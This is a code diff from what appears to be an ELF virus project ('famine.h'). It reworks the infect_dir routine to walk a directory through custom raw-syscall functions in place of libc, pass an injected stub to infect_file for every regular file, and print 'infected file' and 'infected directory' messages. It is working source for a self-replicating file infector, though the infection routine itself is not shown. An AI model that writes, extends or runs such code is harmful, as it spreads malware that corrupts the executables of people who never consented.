@@ -1,6 +1,6 @@
 #include "../include/famine.h"
 
-static int is_regular(const char *path, const struct dirent *ent)
+static int is_regular(const char *path, const struct linux_dirent64 *ent)
 {
 	struct stat st;
 
@@ -30,25 +30,29 @@ static int join_path(char *buf, size_t size, const char *dir, const char *name)
 	return (0);
 }
 
-void infect_dir(const char *dir)
+void infect_dir(const char *dir, const unsigned char *stub, size_t stub_len)
 {
-	DIR				*d;
-	struct dirent	*ent;
+	struct my_DIR	d;
+	struct linux_dirent64	*ent;
 	char			path[PATH_MAX];
 
-	d = opendir(dir);
-	if ( !d)
+	if (!my_opendir(&d, dir))
 		return ;
-	while ((ent = readdir(d)) != NULL)
-	{
+	while ((ent = my_readdir64(&d)) != NULL) {
 		if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
 			continue ;
 		if (join_path(path, sizeof(path), dir, ent->d_name))
 			continue ;
 		if (!is_regular(path, ent))
 			continue ;
-		infect_file(path, stub_bin, stub_bin_len);
+		infect_file(path, stub, stub_len);
+		sys_write(STDOUT_FILENO, "infected file: ", 15);
+		sys_write(STDOUT_FILENO, path, my_strlen(path));
+		sys_write(STDOUT_FILENO, "\n", 1);
 	}
-	closedir(d);
+	my_closedir(&d);
+	sys_write(STDOUT_FILENO, "infected directory: ", 20);
+	sys_write(STDOUT_FILENO, dir, my_strlen(dir));
+	sys_write(STDOUT_FILENO, "\n", 1);
 }
 
